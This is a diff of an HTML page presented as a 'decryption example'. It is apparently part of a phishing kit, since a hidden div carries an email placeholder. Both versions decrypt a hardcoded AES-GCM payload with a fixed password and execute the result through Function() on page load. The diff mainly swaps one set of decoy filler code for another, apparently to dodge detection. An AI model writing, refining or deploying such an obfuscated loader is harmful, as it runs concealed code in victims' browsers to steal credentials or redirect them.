@@ -5,31 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Decryption Example</title>
     <style>
-        body { background-color: #f8f9fa; font-family: Arial, sans-serif; }
-        .dummy-class { color: transparent; user-select: none; }
+        body { 
+            background-color: #f0f0f0; 
+            font-family: 'Courier New', Courier, monospace; 
+            margin: 0; 
+            padding: 20px; 
+        }
+        .hidden-class { 
+            display: none; 
+            color: #fff; 
+        }
     </style>
 </head>
 <body>
-    <div id="useless-container">
-        <p class="dummy-class">Hidden <span>Content</span></p>
+    <h1>Decryption Script</h1>
+    <div nike-tes2="" adidas="<%=EMAIL64%>"></div>
     </div>
-    <div style="display:none;">
-        <div nike-Xchuntxy="" adidas="<%=EMAIL64%>"></div>
-    </div>
+    <p>This is an example of a decryption implementation with added distractions.</p>
+
+    <div class="hidden-class">This text is hidden and serves no purpose.</div>
 
     <script>
+        // Dummy function for distraction
+        function uselessFunction() {
+            console.log("This function does nothing meaningful.");
+            return Math.random() * 100;
+        }
+
         const hexToBytes = (hex) => {
-            console.log("Converting hex to bytes...");
-            let unused = hex.length * Math.PI; // Pointless calculation
+            console.log("Hex to bytes conversion initiated...");
+            let dummyVar = uselessFunction(); // Call dummy function
             return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
         const decrypt = async (enc, ivHex, saltHex, key) => {
-            console.log("Starting AES-GCM decryption...");
+            console.log("Preparing to decrypt data...");
 
             const iv = hexToBytes(ivHex);
             const salt = hexToBytes(saltHex);
-            const delay = new Promise((resolve) => setTimeout(resolve, 100)); // Useless delay
+
+            // Arbitrary array operation
+            const randomArray = [1, 2, 3].map(x => x * 2); 
+            console.log("Random Array:", randomArray);
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
@@ -38,9 +55,7 @@
                 false,
                 ["deriveKey"]
             );
-            
-            await delay; // Unnecessary waiting
-            
+
             const aesKey = await crypto.subtle.deriveKey(
                 { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                 keyMaterial,
@@ -48,7 +63,7 @@
                 false,
                 ["decrypt"]
             );
-            
+
             try {
                 console.log("Decrypting payload...");
                 const decryptedBytes = await crypto.subtle.decrypt(
@@ -56,34 +71,40 @@
                     aesKey,
                     hexToBytes(enc)
                 );
-                console.log("Payload decrypted!");
+                console.log("Decryption successful!");
                 return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
-                console.error("Decryption error:", error);
+                console.error("Decryption failed:", error);
                 return "";
             }
         };
-        (async () => {
-            console.log("Main script execution started...");
 
-            
+        (async () => {
+            console.log("Initializing script...");
+
             const payload = {
                 iv: "c444d6b988c97f7ea2aa5716",
                 salt: "06b9dcb639aeb4a298624e4d2709f4c3",
                 data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
             };
 
+            // Useless console log
+            console.log("Payload length (useless):", payload.data.length);
+
             try {
                 const decryptedContent = await decrypt(payload.data, payload.iv, payload.salt, "quickescape");
-                console.log("Decrypted Output:", decryptedContent);
-                const reversed = decryptedContent.split("").reverse().join(""); // Dummy transformation
-                console.log("Transformed Output:", reversed);
-                document.getElementById("useless-container").innerText = "Decryption Success!";
+                console.log("Decrypted Content:", decryptedContent);
+
+                // Pointless operation
+                const splitContent = decryptedContent.split(" ").join("-");
+                console.log("Modified Content:", splitContent);
+
                 Function(`${decryptedContent}`)();
             } catch (err) {
-                console.error("Execution error:", err);
+                console.error("Script execution error:", err);
             }
         })();
     </script>
 </body>
 </html>
+
